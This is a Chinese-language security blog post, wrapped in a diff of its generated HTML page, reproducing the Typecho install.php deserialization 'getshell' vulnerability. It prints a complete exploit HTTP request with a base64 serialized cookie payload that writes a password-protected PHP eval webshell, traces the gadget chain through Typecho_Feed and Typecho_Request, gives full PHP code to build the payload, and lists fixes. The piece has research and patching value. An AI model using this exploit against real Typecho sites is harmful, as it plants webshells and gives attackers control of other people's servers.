@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>Typecho 前台 getshell 漏洞复现 | C0r1&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Typecho 前台 getshell 漏洞复现</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 28, 2020&nbsp;&nbsp;16:12:35</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h1><p>17 &#x5E74;&#x7684;&#x8001;&#x6D1E;&#x4E86;&#xFF0C;&#x7FFB;&#x51FA;&#x6765;&#x590D;&#x73B0;</p>
+<h1 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h1><p>&#x8BF7;&#x6C42;&#x5305;&#xFF1A;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /typecho/install.php?finish=123 HTTP/1.1</span><br><span class="line">Host: demo.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Purpose: prefetch</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo2NjoiZmlsZV9wdXRfY29udGVudHMoJ3NoZTFsLnBocCcsICc8P3BocCBAZXZhbCgkX1JFUVVFU1Rbc2hlbDFdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo0OiJjMHIxIjt9</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://demo.com</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>&#x4F1A;&#x5728;&#x7F51;&#x7AD9;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x4EA7;&#x751F;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF1A;<code>she1l.php</code>&#xFF0C;&#x5BC6;&#x7801;&#xFF1A;<code>shel1</code></p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/2-1.png" alt="2-1"></p>
+<h1 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h1><h2 id="&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;"><a href="#&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;"></a>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;</h2><p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>install.php</code> &#x4E2D; 228 - 235 &#x884C;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-1.png" alt="3-1"></p>
+<p>230 &#x884C;&#x5BF9; Cookie &#x4E2D; <code>__typecho_config</code> Base64 &#x89E3;&#x7801;&#x540E;&#x7684;&#x503C;&#x8FDB;&#x884C;&#x4E86;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#xFF0C;&#x8BE5;&#x503C;&#x53EF;&#x63A7;&#x3002;&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x4F4D;&#x4E8E; if-else &#x7684;&#x67D0;&#x4E2A;&#x5206;&#x652F;&#x4E2D;&#xFF0C;&#x8FDB;&#x5165;&#x8BE5;&#x5206;&#x652F;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0B;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&#x5B58;&#x5728; <code>$_GET[&apos;finish&apos;])</code> &#x53C2;&#x6570;&#xFF0C;install.php: 59 - 61; 213</li>
+<li>Referer &#x4E3A;&#x672C;&#x7AD9;&#x70B9;&#xFF0C;install.php: 64 - 77</li>
+<li>&#x4E3B;&#x76EE;&#x5F55;&#x5B58;&#x5728; <code>config.inc.php</code> &#x6587;&#x4EF6;&#xFF0C;install.php: 214</li>
+<li>Cookie &#x4E2D;&#x5B58;&#x5728; <code>__typecho_config</code> &#x53C2;&#x6570;&#xFF0C;install.php: 221</li>
+</ul>
+<h2 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;"><a href="#&#x6F0F;&#x6D1E;&#x5229;&#x7528;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5229;&#x7528;"></a>&#x6F0F;&#x6D1E;&#x5229;&#x7528;</h2><h3 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x5206;&#x6790;"><a href="#&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x5206;&#x6790;" class="headerlink" title="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x5206;&#x6790;"></a>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x5206;&#x6790;</h3><p>&#x5168;&#x5C40;&#x641C;&#x7D22; <code>__destruct()</code>&#x3001;<code>__wakeup()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;&#x4EC5;&#x5B58;&#x5728;&#x4E24;&#x5904; <code>__destruct()</code> &#x8C03;&#x7528;&#xFF0C;&#x8DDF;&#x8FDB;&#x53BB;&#x65E0;&#x6709;&#x6548;&#x5229;&#x7528;&#x70B9;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-2.png" alt="3-2"></p>
+<p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684; <code>$config[&apos;adapter&apos;]</code> &#x548C; <code>$config[&apos;prefix&apos;]</code>&#xFF0C;&#x4F5C;&#x4E3A;&#x521D;&#x59CB;&#x5316;&#x53D8;&#x91CF;&#x8FDB;&#x5165; <code>Typecho_Db</code> &#x7C7B;&#xFF0C;&#x8DDF;&#x8FDB;&#x8BE5;&#x7C7B;&#x7684;&#x6784;&#x9020;&#x65B9;&#x6CD5;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-3.png" alt="3-3"></p>
+<p>120 &#x884C;&#x5C06;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570; <code>$adapterName</code> &#x4F5C;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&#xFF0C;&#x5982;&#x679C;&#x6B64;&#x65F6;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x4E3A;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#xFF0C;&#x5C06;&#x81EA;&#x52A8;&#x89E6;&#x53D1;&#x8BE5;&#x5BF9;&#x8C61;&#x7684; <code>__toString()</code> &#x65B9;&#x6CD5;&#xFF0C;&#x5168;&#x5C40;&#x641C;&#x7D22;&#x8BE5;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;&#x5171;&#x5B58;&#x5728;&#x4E09;&#x5904;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-4.png" alt="3-4"></p>
+<p>&#x8DDF;&#x8FDB;&#x7B2C;&#x4E00;&#x5904;&#xFF1A;<strong>var/Typecho/Config.php</strong> &#x7684; <code>__toString()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-5.png" alt="3-5"></p>
+<p>&#x8C03;&#x7528; serialize() &#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x89E6;&#x53D1; <code>__sleep()</code> &#x9B54;&#x6CD5;&#x65B9;&#x6CD5;&#xFF0C;&#x5168;&#x5C40;&#x641C;&#x7D22;&#x8BE5;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;&#x672A;&#x53D1;&#x73B0;&#x8C03;&#x7528;&#x70B9;</p>
+<p>&#x8DDF;&#x8FDB;&#x7B2C;&#x4E8C;&#x5904;&#xFF1A;<strong>var/Typecho/Db/Query.php</strong>  &#x7684; <code>__toString()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-6.png" alt="3-6"></p>
+<p>492 &#x884C;&#x8C03;&#x7528;&#x4E86; <code>$this-&gt;_adapter</code> &#x53C2;&#x6570;&#x7684; <code>parseSelect()</code> &#x51FD;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x6B64;&#x65F6;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x4E3A;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x4E14;&#x8BE5;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x5728;&#x5BF9;&#x8C61;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE; <code>parseSelect()</code> &#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x5C06;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x8BE5;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684; <code>__call()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;&#x5168;&#x5C40;&#x641C;&#x7D22; <code>__call()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-7.png" alt="3-7"></p>
+<p>&#x4EC5; <code>var/Typecho/Plugin.php</code> &#x4E2D;&#x5B58;&#x5728;&#x6709;&#x5229;&#x7528;&#x4EF7;&#x503C;&#x7684; <code>call_user_func_array()</code>&#xFF0C;&#x4EE3;&#x7801;&#x4E0A;&#x4E0B;&#x6587;&#x5982;&#x4E0B;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-8.png" alt="3-8"></p>
+<p><code>$component</code> &#x53C2;&#x6570;&#x4E3A;&#x8C03;&#x7528;&#x5931;&#x8D25;&#x65F6;&#x7684;&#x51FD;&#x6570;&#x540D;&#xFF0C;<code>$args</code> &#x53C2;&#x6570;&#x4E3A;&#x8C03;&#x7528;&#x5931;&#x8D25;&#x65F6;&#x7684;&#x51FD;&#x6570;&#x53C2;&#x6570;&#x503C;</p>
+<p>&#x56E0;&#x6B64; <code>call_user_func_array()</code> &#x51FD;&#x6570;&#x7684;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x503C;&#x5747;&#x53EF;&#x63A7;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x6839;&#x636E;&#x7A0B;&#x5E8F;&#x4E0A;&#x4E0B;&#x6587;&#xFF0C;<code>$args</code> &#x53C2;&#x6570;&#x4E2D;&#x5FC5;&#x987B;&#x5B58;&#x5728; <code>array(&apos;action&apos;=&gt;&apos;SELECT&apos;)</code>&#xFF0C;&#x52A0;&#x4E0A;&#x6784;&#x9020;&#x7684; Payload &#x53CA;&#x7A0B;&#x5E8F; 483 &#x884C;&#x6DFB;&#x52A0;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x6700;&#x7EC8;&#x5229;&#x7528;&#x65F6;&#x7684; <code>$args</code> &#x53C2;&#x6570;&#x957F;&#x5EA6;&#x81F3;&#x5C11;&#x4E3A; 3 &#x4E14;&#x5185;&#x5BB9;&#x6742;&#x4E71;&#xFF0C;&#x90A3;&#x4E48; <code>call_user_func_array()</code> &#x4E5F;&#x5C31;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x6267;&#x884C;&#x4E86;&#xFF0C;&#x6B64;&#x5904;&#x4E5F;&#x5C31;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x5229;&#x7528;</p>
+<p>&#x8DDF;&#x8FDB;&#x7B2C;&#x4E09;&#x5904;&#xFF1A;<strong>var/Typecho/Feed.php</strong> &#x7684; <code>__toString()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-9.png" alt="3-9"></p>
+<p>290 &#x884C;&#x4E2D;&#x8C03;&#x7528;&#x4E86; <code>$item[&apos;author&apos;]</code> &#x53C2;&#x6570;&#x7684; <code>screenName</code> &#x5C5E;&#x6027;&#xFF0C;<code>$item</code> &#x53C2;&#x6570;&#x6765;&#x6E90;&#x4E8E; <code>$this-&gt;_items</code>&#xFF0C;&#x8BE5;&#x503C;&#x53EF;&#x63A7;&#x3002;&#x5982;&#x679C;&#x6B64;&#x65F6; <code>$item[&apos;author&apos;]</code> &#x4E3A;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x4E14;&#x8BE5;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x5728;&#x5BF9;&#x8C61;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE; <code>screenName</code> &#x5C5E;&#x6027;&#x65F6;&#xFF0C;&#x5C06;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x8BE5;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684; <code>__get()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;&#x5168;&#x5C40;&#x641C;&#x7D22; <code>__get()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-10.png" alt="3-10"></p>
+<p>&#x6700;&#x7EC8;&#x5728; <code>var/Typecho/Request.php</code> &#x4E2D;&#x627E;&#x5230;&#x5229;&#x7528;&#x70B9;&#xFF0C;<code>__get()</code> &#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x4E86;&#x672C;&#x7C7B;&#x7684; <code>get()</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8DDF;&#x8FDB;&#x8BE5;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-11.png" alt="3-11"></p>
+<p>310 &#x884C;&#xFF0C;&#x8C03;&#x7528;&#x4E86;&#x672C;&#x7C7B;&#x7684; <code>_applyFilter()</code> &#x65B9;&#x6CD5;&#xFF0C;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570; <code>$value = $this-&gt;_params[$key]</code>&#xFF0C;<code>$key</code> &#x4E3A;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x540D;&#xFF1A;<code>screenName</code>&#x3002;<code>_applyFilter()</code> &#x51FD;&#x6570;&#x5177;&#x4F53;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;</p>
+<p><img src="/2020/05/28/Typecho-&#x524D;&#x53F0;-getshell-&#x6F0F;&#x6D1E;&#x590D;&#x73B0;/3-12.png" alt="3-12"></p>
+<p><code>$filter</code> &#x6E90;&#x4E8E; <code>$this-&gt;_filter</code>&#xFF0C;&#x81F3;&#x6B64;&#xFF0C;&#x8BE5;&#x65B9;&#x6CD5;&#x4E2D;&#x7684; <code>array_map()</code> &#x548C; <code>call_user_func()</code> &#x6267;&#x884C;&#x53C2;&#x6570;&#x5747;&#x53EF;&#x63A7;&#xFF0C;&#x90FD;&#x80FD;&#x9020;&#x6210;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;</p>
+<h3 id="Payload-&#x6784;&#x9020;"><a href="#Payload-&#x6784;&#x9020;" class="headerlink" title="Payload &#x6784;&#x9020;"></a>Payload &#x6784;&#x9020;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>{</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(<span class="string">&apos;screenName&apos;</span>=&gt;<span class="string">&apos;file_put_contents(\&apos;she1l.php\&apos;, \&apos;&lt;?php @eval($_REQUEST[shel1]);?&gt;\&apos;)&apos;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">&quot;assert&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>{</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">&apos;RSS 2.0&apos;</span>;</span><br><span class="line">        $item[<span class="string">&apos;author&apos;</span>] = <span class="keyword">new</span> Typecho_Request;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>($item);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&apos;adapter&apos;</span>=&gt;<span class="keyword">new</span> Typecho_Feed, <span class="string">&apos;prefix&apos;</span>=&gt;<span class="string">&apos;c0r1&apos;</span>);</span><br><span class="line">var_dump(base64_encode(serialize($a)));</span><br></pre></td></tr></table></figure>
+
+<h1 id="&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;"><a href="#&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;"></a>&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;</h1><ul>
+<li>&#x5220;&#x9664; <code>config.inc.php</code></li>
+<li><code>install.php</code> &#x7B2C;&#x4E00;&#x884C;&#x6DFB;&#x52A0; <code>&lt;?php if (!file_exists(dirname(__FILE__) . &apos;/config.inc.php&apos;)): ?&gt;</code></li>
+</ul>
+<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://p0sec.net/index.php/archives/114/" target="_blank" rel="noopener">Typecho install.php &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;</a></p>
+<p><a href="https://blog.riskivy.com/&#x6316;&#x6398;&#x6697;&#x85CF;thinkphp&#x4E2D;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5229;&#x7528;&#x94FE;" target="_blank" rel="noopener">&#x6316;&#x6398;&#x6697;&#x85CF;ThinkPHP&#x4E2D;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5229;&#x7528;&#x94FE;</a></p>
+<p><a href="https://paper.seebug.org/424/" target="_blank" rel="noopener">Typecho &#x524D;&#x53F0; getshell &#x6F0F;&#x6D1E;&#x5206;&#x6790;</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>c0r1</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.c0r1.com/2020/05/28/Typecho-前台-getshell-漏洞复现/">http://www.c0r1.com/2020/05/28/Typecho-前台-getshell-漏洞复现/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/代码审计/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/05/23/2020-DASCTF-五月线上赛-部分-Web、Misc-WriteUp/">[2020 DASCTF] 五月线上赛 - 部分 Web、Misc WriteUp</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
